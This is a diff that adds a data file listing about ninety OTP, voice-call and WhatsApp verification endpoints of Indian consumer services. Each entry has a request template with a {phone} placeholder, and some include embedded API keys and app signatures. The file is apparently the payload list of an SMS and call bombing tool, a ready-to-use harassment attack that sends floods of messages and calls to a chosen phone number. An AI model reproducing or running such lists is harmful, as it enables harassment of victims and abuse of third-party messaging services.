@@ -1,0 +1,91 @@
+Tata Capital Voice Call|https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice|POST|{"phone":"{phone}","isOtpViaCallAtLogin":"true"}
+1MG Voice Call|https://www.1mg.com/auth_api/v6/create_token|POST|{"number":"{phone}","otp_on_call":true}
+Swiggy Call Verification|https://profile.swiggy.com/api/v3/app/request_call_verification|POST|{"mobile":"{phone}"}
+Myntra Voice Call|https://www.myntra.com/gw/mobile-auth/voice-otp|POST|{"mobile":"{phone}"}
+Flipkart Voice Call|https://www.flipkart.com/api/6/user/voice-otp/generate|POST|{"mobile":"{phone}"}
+Paytm Voice Call|https://accounts.paytm.com/signin/voice-otp|POST|{"phone":"{phone}"}
+Zomato Voice Call|https://www.zomato.com/php/o2_api_handler.php|POST|phone={phone}&type=voice
+MakeMyTrip Voice Call|https://www.makemytrip.com/api/4/voice-otp/generate|POST|{"phone":"{phone}"}
+Goibibo Voice Call|https://www.goibibo.com/user/voice-otp/generate/|POST|{"phone":"{phone}"}
+Ola Voice Call|https://api.olacabs.com/v1/voice-otp|POST|{"phone":"{phone}"}
+Uber Voice Call|https://auth.uber.com/v2/voice-otp|POST|{"phone":"{phone}"}
+KPN WhatsApp|https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6|POST|{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}
+Foxy WhatsApp|https://www.foxy.in/api/v2/users/send_otp|POST|{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}
+Stratzy WhatsApp|https://stratzy.in/api/web/whatsapp/sendOTP|POST|{"phoneNo":"{phone}"}
+Rappi WhatsApp|https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create|POST|{"country_code":"+91","phone":"{phone}"}
+Eka Care WhatsApp|https://auth.eka.care/auth/init|POST|{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}
+Lenskart SMS|https://api-gateway.juno.lenskart.com/v3/customers/sendOtp|POST|{"phoneCode":"+91","telephone":"{phone}"}
+NoBroker SMS|https://www.nobroker.in/api/v3/account/otp/send|POST|phone={phone}&countryCode=IN
+PharmEasy SMS|https://pharmeasy.in/api/v2/auth/send-otp|POST|{"phone":"{phone}"}
+Wakefit SMS|https://api.wakefit.co/api/consumer-sms-otp/|POST|{"mobile":"{phone}"}
+Byju's SMS|https://api.byjus.com/v2/otp/send|POST|{"phone":"{phone}"}
+Hungama OTP|https://communication.api.hungama.com/v1/communication/otp|POST|{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}
+Meru Cab|https://merucabapp.com/api/otp/generate|POST|mobile_number={phone}
+Doubtnut|https://api.doubtnut.com/v4/student/login|POST|{"phone_number":"{phone}","language":"en"}
+PenPencil|https://api.penpencil.co/v1/users/resend-otp?smsType=1|POST|{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}
+Snitch|https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2|POST|{"mobile_number":"+91{phone}"}
+Dayco India|https://ekyc.daycoindia.com/api/nscript_functions.php|POST|api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp
+BeepKart|https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp|POST|{"phone":"{phone}","city":362}
+Lending Plate|https://lendingplate.com/api.php|POST|mobiles={phone}&resend=Resend
+ShipRocket|https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send|POST|{"mobileNumber":"{phone}"}
+GoKwik|https://gkx.gokwik.co/v3/gkstrict/auth/otp/send|POST|{"phone":"{phone}","country":"in"}
+NewMe|https://prodapi.newme.asia/web/otp/request|POST|{"mobile_number":"{phone}","resend_otp_request":true}
+Smytten|https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode|POST|{"phone":"{phone}","email":"test@example.com"}
+CaratLane|https://www.caratlane.com/cg/dhevudu|POST|{"query":"mutation {SendOtp(input: {mobile: \"{phone}\",isdCode: \"91\",otpType: \"registerOtp\"}) {status {message code}}}"}
+BikeFixup|https://api.bikefixup.com/api/v2/send-registration-otp|POST|{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}
+WellAcademy|https://wellacademy.in/store/api/numberLoginV2|POST|{"contact_no":"{phone}"}
+ServeTel|https://api.servetel.in/v1/auth/otp|POST|mobile_number={phone}
+GoPink Cabs|https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php|POST|check_mobile_number=1&contact={phone}
+Shemaroome|https://www.shemaroome.com/users/resend_otp|POST|mobile_no=%2B91{phone}
+Cossouq|https://www.cossouq.com/mobilelogin/otp/send|POST|mobilenumber={phone}&otptype=register
+MyImagineStore|https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/|POST|mobile={phone}
+Otpless|https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3|POST|{"mobile":"{phone}","selectedCountryCode":"+91"}
+MyHubble Money|https://api.myhubble.money/v1/auth/otp/generate|POST|{"phoneNumber":"{phone}","channel":"SMS"}
+Tata Capital Business|https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp|POST|{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}
+DealShare|https://services.dealshare.in/userservice/api/v1/user-login/send-login-code|POST|{"mobile":"{phone}","hashCode":"k387IsBaTmn"}
+Snapmint|https://api.snapmint.com/v1/public/sign_up|POST|{"phone":"{phone}"}
+Housing.com|https://login.housing.com/api/v2/send-otp|POST|{"phone":"{phone}","country_url_name":"in"}
+RentoMojo|https://www.rentomojo.com/api/RMUsers/isNumberRegistered|POST|{"phone":"{phone}"}
+Khatabook|https://api.khatabook.com/v1/auth/request-otp|POST|{"phone":"{phone}","app_signature":"wk+avHrHZf2"}
+Netmeds|https://apiv2.netmeds.com/mst/rest/v1/id/details/|POST|{"mobile":"{phone}"}
+Nykaa|https://www.nykaa.com/app-api/index.php/customer/send_otp|POST|source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa
+RummyCircle|https://www.rummycircle.com/api/fl/auth/v3/getOtp|POST|{"mobile":"{phone}","isPlaycircle":false}
+Animall|https://animall.in/zap/auth/login|POST|{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}
+Entri|https://entri.app/api/v3/users/check-phone/|POST|{"phone":"{phone}"}
+Cosmofeed|https://prod.api.cosmofeed.com/api/user/authenticate|POST|{"phone":"{phone}","version":"1.4.28"}
+Aakash|https://antheapi.aakash.ac.in/api/generate-lead-otp|POST|{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}
+Revv|https://st-core-admin.revv.co.in/stCore/api/customer/v1/init|POST|{"mobile":"{phone}","deviceType":"website"}
+DeHaat|https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP|POST|{"mobile":"{phone}","client_id":"kisan-app"}
+A23 Games|https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2|POST|{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}
+Spencer's|https://jiffy.spencers.in/user/auth/otp/send|POST|{"mobile":"{phone}"}
+PayMe India|https://api.paymeindia.in/api/v2/authentication/phone_no_verify/|POST|{"phone":"{phone}","app_signature":"S10ePIIrbH3"}
+Shopper's Stop|https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB|POST|{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}
+Hyuga Auth|https://hyuga-auth-service.pratech.live/v1/auth/otp/generate|POST|{"mobile":"{phone}"}
+Lifestyle Stores|https://www.lifestylestores.com/in/en/mobilelogin/sendOTP|POST|{"signInMobile":"{phone}","channel":"sms"}
+PokerBaazi|https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp|POST|{"mobile":"{phone}","mfa_channels":"phno"}
+My11Circle|https://www.my11circle.com/api/fl/auth/v3/getOtp|POST|{"mobile":"{phone}"}
+MamaEarth|https://auth.mamaearth.in/v1/auth/initiate-signup|POST|{"mobile":"{phone}"}
+HomeTriangle|https://hometriangle.com/api/partner/xauth/signup/otp|POST|{"mobile":"{phone}"}
+HealthMug|https://api.healthmug.com/account/createotp|POST|{"mobile":"{phone}"}
+Kredily|https://app.kredily.com/ws/v1/accounts/send-otp/|POST|{"mobile":"{phone}"}
+Tata Motors|https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json|POST|{"mobile":"{phone}","sendOtp":"true"}
+Moglix|https://apinew.moglix.com/nodeApi/v1/login/sendOTP|POST|{"mobile":"{phone}","buildVersion":"24.0"}
+TrulyMadly|https://app.trulymadly.com/api/auth/mobile/v1/send-otp|POST|{"mobile":"{phone}","locale":"IN"}
+Apna|https://production.apna.co/api/userprofile/v1/otp/|POST|{"mobile":"{phone}","hash_type":"play_store"}
+Swipe|https://app.getswipe.in/api/user/mobile_login|POST|{"mobile":"{phone}","resend":true}
+More Retail|https://omni-api.moreretail.in/api/v1/login/|POST|{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}
+Country Delight|https://api.countrydelight.in/api/v1/customer/requestOtp|POST|{"mobile":"{phone}","platform":"Android","mode":"new_user"}
+Rapido|https://customer.rapido.bike/api/otp|POST|{"mobile":"{phone}"}
+BetterHalf|https://api.betterhalf.ai/v2/auth/otp/send/|POST|{"mobile":"{phone}","isd_code":"91"}
+Charzer|https://api.charzer.com/auth-service/send-otp|POST|{"mobile":"{phone}","appSource":"CHARZER_APP"}
+Nuvama Wealth|https://nma.nuvamawealth.com/edelmw-content/content/otp/register|POST|{"mobileNo":"{phone}","emailID":"test@example.com"}
+Mpokket|https://web-api.mpokket.in/registration/sendOtp|POST|{"mobile":"{phone}"}
+Jockey WhatsApp|https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true|GET|
+Univest|https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}|GET|
+BigCash|https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1|GET|
+WorkIndia|https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623|GET|
+Vyapar|https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}|GET|
+MyGov|https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male|GET|
+CodFirm|https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com|GET|
+AstroSage|https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}|GET|
+ConfirmTkt|https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}|GET|
